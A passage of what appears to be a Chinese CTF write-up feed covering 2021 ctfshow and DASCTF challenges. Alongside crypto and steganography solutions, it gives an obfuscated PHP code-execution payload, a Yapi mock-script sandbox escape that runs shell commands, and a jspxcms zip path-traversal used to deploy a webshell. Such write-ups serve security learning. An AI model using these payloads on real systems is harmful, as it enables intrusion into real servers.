class="subst">&#123;out&#125;</span>?&gt;&lt;?=($&#123;&#123;_.<span class="subst">&#123;func&#125;</span>&#125;&#125;[0])($&#123;&#123;_.<span class="subst">&#123;func&#125;</span>&#125;&#125;[1]);&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>POST：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf_show = </span><br><span class="line">$_=([].C)[3];$α=$_;$_++;$_++;$_++;$_++;$ε=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$σ=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$χ=$_;$β=$ε.$χ.$α.$σ;$_=C;$_++;$_++;$γ=$_;$_++;$_++;$ε=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$μ=$_;($&#123;_.$ε.$γ.$μ&#125;[0])($&#123;_.$ε.$γ.$μ&#125;[1]);</span><br></pre></td></tr></table></figure><p>GET:</p><p><code>?looklook=1&amp;0=file_get_contents&amp;1=/flag.txt</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;比赛名称：ctfshow 吃瓜杯&lt;br&gt;题目范围：web pwn re misc crypto&lt;br&gt;题目难度：怎么简单怎么来&lt;br&gt;比赛奖励：ctfshow定制鼠标垫或萌妹手办&lt;br&gt;比赛时间：2021年8月14日(周六) 晚 7点7分&lt;br&gt;比</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2021DASCTF July X CBCTF 4th</title>
    <link href="https://lazzzaro.github.io/2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/"/>
    <id>https://lazzzaro.github.io/2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/</id>
    <published>2021-08-01T10:13:02.000Z</published>
    <updated>2021-08-02T15:57:40.821Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>2021 DASCTF实战精英夏令营预热赛<br>DASCTF July x CBCTF 4th<br>主办单位: 安恒信息、杭州电子科技大学网络空间安全学院<br>竞赛时间: 2021年7月31日10:00- 2021年8月1日18:00<br>报名时间: 2021年7月15日10:00-2021年7月31日10:00<br>报名地址: <a href="https://buuoj.cn/das">https://buuoj.cn/das</a><br>报名方式: 登录后点击[个人信息]完善个人信息&gt;点击[参与情况]创建战队-&gt;分享战队Token给自己的队员-&gt;等待比赛开始<br>竞赛方式: 团队赛(最多三人一组)<br>命题战队: 0rays </p><p>Rank: 42</p><hr><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Yusa的密码学签到——BlockTrick"><a href="#Yusa的密码学签到——BlockTrick" class="headerlink" title="Yusa的密码学签到——BlockTrick"></a>Yusa的密码学签到——BlockTrick</h3><blockquote><p>好久不见，上课前先签个到叭！此题 nc 连接。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">a</span>):</span></span><br><span class="line">size = (<span class="number">16</span>-<span class="built_in">len</span>(a)%<span class="number">16</span>)%<span class="number">16</span></span><br><span class="line">a += <span class="built_in">chr</span>(size)*size</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">enc = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line"><span class="built_in">print</span>(iv.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">trick = raw_input(<span class="string">&quot;&quot;</span>)</span><br><span class="line">trick = pad(trick.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">cipher = enc.encrypt(trick)</span><br><span class="line"><span class="keyword">if</span> trick == cipher <span class="keyword">and</span> trick != <span class="string">&quot;&quot;</span> :</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="built_in">print</span>(f.read())</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(cipher.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Try again&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure></blockquote><p>AES-CBC模式原理。</p><p>第一次：</p><p>令 <code>P0 = IV</code></p><p><code>C0 = Encrypt(P0 XOR IV) = Encrypt(0)</code></p><p>第二次：</p><p>令 <code>P1 = C0</code></p><p><code>C1 = Encrypt(P1 XOR C0) = Encrypt(C0 XOR C0) = Encrypt(0) = C0 = P1</code></p><p>​    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="red-vs-blue"><a href="#red-vs-blue" class="headerlink" title="red_vs_blue"></a>red_vs_blue</h3><blockquote><p>红队和蓝队将开展66轮对抗，你能预测出每轮对抗的结果吗？</p><p>nc连接</p></blockquote><p>同一次连接内，错误可以反复从头猜，66次随机结果不变，存储之前猜对的正确结果，错误时再重猜当前次数的另一种结果即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29203</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">ans=[<span class="string">&#x27;?&#x27;</span>]*<span class="number">67</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i&lt;=<span class="number">66</span>:</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">r.recvline()</span><br><span class="line"><span class="keyword">if</span> ans[i]==<span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">r.sendline(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">x=r.recvline()</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> x:</span><br><span class="line">ans[i]=<span class="string">&#x27;r&#x27;</span></span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;Sorry&#x27;</span> <span class="keyword">in</span> x:</span><br><span class="line">ans[i]=<span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Play again? (y/n): &#x27;</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r.sendline(ans[i])</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="funny-maze"><a href="#funny-maze" class="headerlink" title="funny_maze"></a>funny_maze</h3><blockquote><p>七月被困在了迷宫里，十秒后迷宫的终点就要永远消失了，你能帮她走出迷宫吗？</p><p>nc 连接</p></blockquote><p>DFS算法走迷宫。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27139</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sol</span>(<span class="params">maze</span>):</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(path) &gt; <span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join(<span class="string">&#x27;&#x27;</span>.join(row) <span class="keyword">for</span> row <span class="keyword">in</span> maze))</span><br><span class="line">solution = <span class="string">&#x27;&#x27;</span>.join(path)[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(solution)</span><br><span class="line"><span class="keyword">global</span> path</span><br><span class="line">path = []</span><br><span class="line"><span class="keyword">return</span> solution</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">maze, y, x</span>):</span></span><br><span class="line"><span class="keyword">if</span> maze[y][x] <span class="keyword">in</span> (<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;S&#x27;</span>):</span><br><span class="line">tag = <span class="string">&#x27;o&#x27;</span></span><br><span class="line">maze[y][x] = tag</span><br><span class="line"><span class="keyword">if</span> dfs(maze, y, x+<span class="number">1</span>) == <span class="literal">True</span>:</span><br><span class="line">tag = <span class="string">&#x27;R&#x27;</span></span><br><span class="line">path.append(tag)</span><br><span class="line"><span class="keyword">elif</span> dfs(maze, y+<span class="number">1</span>, x) == <span class="literal">True</span>:</span><br><span class="line">tag = <span class="string">&#x27;D&#x27;</span></span><br><span class="line">path.append(tag)</span><br><span class="line"><span class="keyword">elif</span> dfs(maze, y, x-<span class="number">1</span>) == <span class="literal">True</span>:</span><br><span class="line">tag = <span class="string">&#x27;L&#x27;</span></span><br><span class="line">path.append(tag)</span><br><span class="line"><span class="keyword">elif</span> dfs(maze, y-<span class="number">1</span>, x) == <span class="literal">True</span>:</span><br><span class="line">tag = <span class="string">&#x27;U&#x27;</span></span><br><span class="line">path.append(tag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">tag = <span class="string">&#x27; &#x27;</span></span><br><span class="line">maze[y][x] = tag</span><br><span class="line"><span class="keyword">return</span> (tag != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> maze[y][x] == <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">maze = []</span><br><span class="line"></span><br><span class="line">first = p.recvline().strip()</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;#&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> first:</span><br><span class="line"><span class="built_in">print</span>(first)</span><br><span class="line"><span class="built_in">print</span>(p.recvall())</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">leng = <span class="built_in">len</span>(first)</span><br><span class="line">maze.append(<span class="built_in">list</span>(first))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(leng-<span class="number">1</span>):</span><br><span class="line">now = p.recvline().strip()</span><br><span class="line">maze.append(<span class="built_in">list</span>(now))</span><br><span class="line"></span><br><span class="line">start = []</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(maze)):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(maze[y])):</span><br><span class="line"><span class="keyword">if</span> maze[y][x] == <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">start = [y,x]</span><br><span class="line"></span><br><span class="line">path = []</span><br><span class="line">dfs(maze, start[<span class="number">0</span>], start[<span class="number">1</span>])</span><br><span class="line">sol = get_sol(maze)</span><br><span class="line"><span class="built_in">print</span>(sol)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(sol)+<span class="number">1</span>))</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezSteganography"><a href="#ezSteganography" class="headerlink" title="ezSteganography"></a>ezSteganography</h3><blockquote><p>有手就行的隐写</p></blockquote><p>10M+ png图。</p><p>zsteg在G通道发现隐写另一png图，文字只有一半flag：</p><p><img src="match-2021DASCTF-July-X-CBCTF-4th\part1.png" alt="part1" style="zoom: 25%;" /></p><p>查找QIM算法：</p><blockquote><p>量化索引调制算法(QIM)是一种经典的水印算法，它根据水印信息，把原始载体数据用量化器量化到不同的索引区间，能在获取较高的鲁棒性同时，具有较小嵌入失真。QIM算法能有效抵抗滤波、噪声、剪切等常见攻击。</p></blockquote><p>找到<a href="https://github.com/pl561/QuantizationIndexModulation">具体实现代码</a>，将输入从一维修改为二维图像矩阵：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;Implementation of QIM method from Data Hiding Codes, Moulin and Koetter, 2005&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">HOME = os.environ[<span class="string">&quot;HOME&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QIM</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, delta</span>):</span></span><br><span class="line">self.delta = delta</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">embed</span>(<span class="params">self, x, m</span>):</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">x is a vector of values to be quantized individually</span></span><br><span class="line"><span class="string">m is a binary vector of bits to be embeded</span></span><br><span class="line"><span class="string">returns: a quantized vector y</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">x = x.astype(<span class="built_in">float</span>)</span><br><span class="line">d = self.delta</span><br><span class="line">y = np.<span class="built_in">round</span>(x/d) * d + (-<span class="number">1</span>)**(m+<span class="number">1</span>) * d/<span class="number">4.</span></span><br><span class="line"><span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detect</span>(<span class="params">self, z</span>):</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">z is the received vector, potentially modified</span></span><br><span class="line"><span class="string">returns: a detected vector z_detected and a detected message m_detected</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shape = z.shape</span><br><span class="line">z = z.flatten()</span><br><span class="line"></span><br><span class="line">m_detected = np.zeros_like(z, dtype=<span class="built_in">float</span>)</span><br><span class="line">z_detected = np.zeros_like(z, dtype=<span class="built_in">float</span>)</span><br><span class="line"></span><br><span class="line">z0 = self.embed(z, <span class="number">0</span>)</span><br><span class="line">z1 = self.embed(z, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d0 = np.<span class="built_in">abs</span>(z - z0)</span><br><span class="line">d1 = np.<span class="built_in">abs</span>(z - z1)</span><br><span class="line"></span><br><span class="line">gen = <span class="built_in">zip</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(z_detected)), d0, d1)</span><br><span class="line"><span class="keyword">for</span> i, dd0, dd1 <span class="keyword">in</span> gen:</span><br><span class="line"><span class="keyword">if</span> dd0 &lt; dd1:</span><br><span class="line">m_detected[i] = <span class="number">0</span></span><br><span class="line">z_detected[i] = z0[i]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">m_detected[i] = <span class="number">1</span></span><br><span class="line">z_detected[i] = z1[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">z_detected = z_detected.reshape(shape)</span><br><span class="line">m_detected = m_detected.reshape(shape)</span><br><span class="line"><span class="keyword">return</span> z_detected, m_detected.astype(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_msg</span>(<span class="params">self, l</span>):</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">returns: a random binary sequence of length l</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">return</span> np.random.choice((<span class="number">0</span>, <span class="number">1</span>), l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_qim</span>():</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">tests the embed and detect methods of class QIM</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#l = 10000 # binary message length</span></span><br><span class="line">delta = <span class="number">20</span> <span class="comment"># quantization step</span></span><br><span class="line">qim = QIM(delta)</span><br><span class="line"></span><br><span class="line"><span class="comment">#x = np.random.randint(0, 255, l).astype(float) # host sample</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#msg = qim.random_msg(l)</span></span><br><span class="line"><span class="comment">#y = qim.embed(x, msg)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;ezSteganography-flag.png&#x27;</span>)</span><br><span class="line">y = np.array(img)</span><br><span class="line"></span><br><span class="line">z_detected, msg_detected = qim.detect(y)</span><br><span class="line">new_img = Image.fromarray(np.uint8(<span class="number">255</span>*msg_detected))</span><br><span class="line">new_img.save(<span class="string">&#x27;part2.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(x)</span></span><br><span class="line"><span class="comment">#print(msg)</span></span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="built_in">print</span>(z_detected)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(msg)</span></span><br><span class="line"><span class="built_in">print</span>(msg_detected)</span><br><span class="line"><span class="comment">#assert np.allclose(msg, msg_detected) # compare the original and detected messages</span></span><br><span class="line"><span class="comment">#assert np.allclose(y, z_detected) # compare the original and detected vectors</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">test_qim()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">sys.exit(main())</span><br></pre></td></tr></table></figure><p>得到隐写png水印图片：</p><p><img src="match-2021DASCTF-July-X-CBCTF-4th\part2.png" alt="part2" style="zoom: 25%;" /></p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h3><blockquote><p>你真的会 nodejs 吗？</p></blockquote><p><a href="https://www.secpulse.com/archives/162502.html">Yapi远程命令执行漏洞</a>。</p><p>注册并登录账号，添加项目，选择设置，设置全局mock脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString()</span><br></pre></td></tr></table></figure><p>打开脚本，添加一个接口，访问Mock地址即可成功RCE。</p><p>​    </p><h3 id="jspxcms"><a href="#jspxcms" class="headerlink" title="jspxcms"></a>jspxcms</h3><blockquote><p><a href="http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/">http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/</a></p><p>靶机每十分钟重置一次。</p></blockquote><p><a href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/">Jspxcms解压getshell漏洞</a>。</p><p>参考<a href="https://www.laoliang.net/jsjh/technology/6525.html">信息</a>登录后台<code>/cmscp/index.do</code>，<code>admin/空</code> 弱口令进入后台，在文件管理可上传文件。</p><p>虽然能上传任意文件，但在<code>JspDispatcherFilter.java</code>限制了对jsp文件的访问，但可上传并解压zip文件，因<code>WebFileUploadsController.java</code>里的<code>unzip</code>方法调用了下层方法却没有进行文件名检查，导致可以目录穿透。</p><p>将大马<code>cmd.war</code>打包上传并解压，默认放在<code>\webapps\ROOT\uploads\1\</code>下，再修改文件名为<code>../../../cmd.war</code>即可将<code>cmd.war</code>置于<code>webapps</code>根目录下，可自动解析。</p><p>访问<code>/cmd</code>查看根目录flag。</p><p>​    </p><h3 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h3><blockquote><p>赛博CMS，只为安全而生</p><p>Hint: 信息搜集是一个web手必备的技能</p></blockquote><p>下载源码<code>www.zip</code>，在<code>/admin/version.php</code>中发现此为BEESCMS v4.0改的CMS。</p><p>找到后台登录页面存在<a href="https://www.cnblogs.com/yuzly/p/11423384.html">Beescms_v4.0 SQL注入漏洞</a>，不同在于过滤函数除了<code>fl_value</code>和<code>fl_html</code>，还多了个<code>f1_vvv</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\.\.\/|\.\/| union | from | where | group | into |load_file</span></span><br><span class="line"><span class="string">|outfile/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line">define(<span class="string">&#x27;INC_BEES&#x27;</span>,<span class="string">&#x27;B&#x27;</span>.<span class="string">&#x27;EE&#x27;</span>.<span class="string">&#x27;SCMS&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_html</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> htmlspecialchars(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1_vvv</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span 